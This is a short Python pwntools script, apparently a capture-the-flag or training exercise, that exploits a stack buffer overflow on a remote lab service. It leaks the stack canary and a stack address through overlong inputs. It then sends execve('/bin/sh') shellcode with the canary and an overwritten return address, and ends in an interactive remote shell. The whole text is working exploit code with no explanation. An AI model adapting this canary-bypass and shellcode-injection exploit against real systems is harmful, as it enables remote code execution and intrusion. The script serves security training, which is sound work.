from pwn import *
import time

context.terminal = ['tmux','splitw','-h']

r = remote("training.jinblack.it", 2011)

r.send("A"*105)

time.sleep(0.2)
print(r.recvuntil("> "))
r.recv(105)

time.sleep(0.2)

canary = u64(b"\x00" + r.recv(7))

time.sleep(0.2)

print("0x%x" % canary)

r.send("A"*136)

print(r.recvuntil("> "))

time.sleep(0.2)

r.recv(136)

stack_address = u64(r.recv(6) + b"\x00\x00") - 0x157

print("0x%x" % stack_address)

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
shellcode = shellcode.ljust(104, b"A") + p64(canary) + b"B" * 8 +  p64(stack_address)

r.send(shellcode)

r.interactive()


